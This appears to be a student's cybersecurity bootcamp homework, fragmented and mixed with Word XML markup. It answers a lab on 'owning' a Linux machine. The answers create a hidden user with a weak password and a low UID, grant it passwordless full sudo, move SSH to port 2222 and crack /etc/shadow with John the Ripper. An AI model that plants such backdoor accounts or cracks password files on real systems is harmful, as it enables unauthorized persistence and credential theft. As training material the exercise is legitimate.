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 Week 6 Homework Submission File: Advanced Bash - Owning the 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Please edit this file by adding the solution commands on the line below the prompt. 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Save and submit the completed file for your homework submission.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 1: Shadow People** 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Create a secret user named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. Make sure this user doesn't have a home folder created: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adduser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 your secret user a password: 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adduser sysd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ab/>
        <w:t xml:space="preserve">passw0rd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 your secret user a system UID &lt; 1000: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usermod – u 666 sysd</w:t>
      </w:r>
      <w:ins w:author="Robert Evans" w:id="0" w:date="2022-02-12T15:11:20Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:cs="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
            <w:color w:val="dd1144"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:t xml:space="preserve"> Really  :)  Must be a dark theme user :)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 your secret user the same GID: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groupadd -g 666 mygroup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ab/>
        <w:t xml:space="preserve">usermod -g 666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5. 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 your secret user full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access without the need for a password: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-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visudo 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ab/>
        <w:t xml:space="preserve">sysd ALL=(ALL) NOPASSWD:ALL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6. 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Test that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access works without your password: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Sudo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 2: Smooth Sailing**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Edit the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`sshd_config`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file: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    </w:t>
        <w:tab/>
        <w:t xml:space="preserve">As root user nano sshd_config and uncomment port options and add port 2222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firstLine="720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Port 22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firstLine="720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Port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 3: Testing Your Configuration Update**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Restart the SSH service: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service sshd restart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Exit the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account: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exit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SSH to the target machine using your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account and port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ssh </w:t>
      </w:r>
      <w:hyperlink r:id="rId6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sysd@192.168.6.105</w:t>
        </w:r>
      </w:hyperlink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-p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Use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to switch to the root user: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sudo -s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 4: Crack All the Passwords**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1. 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SSH back to the system using your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 account and port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    - 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ssh </w:t>
      </w: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sysd@192.168.6.105</w:t>
        </w:r>
      </w:hyperlink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-p 2222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ab/>
        <w:t xml:space="preserve">Sudo -s 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From root directory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ab/>
        <w:t xml:space="preserve">John ../etc/shadow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ab/>
        <w:t xml:space="preserve">John –-show ../etc/shadow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ysd@192.168.6.105" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:sysd@192.168.6.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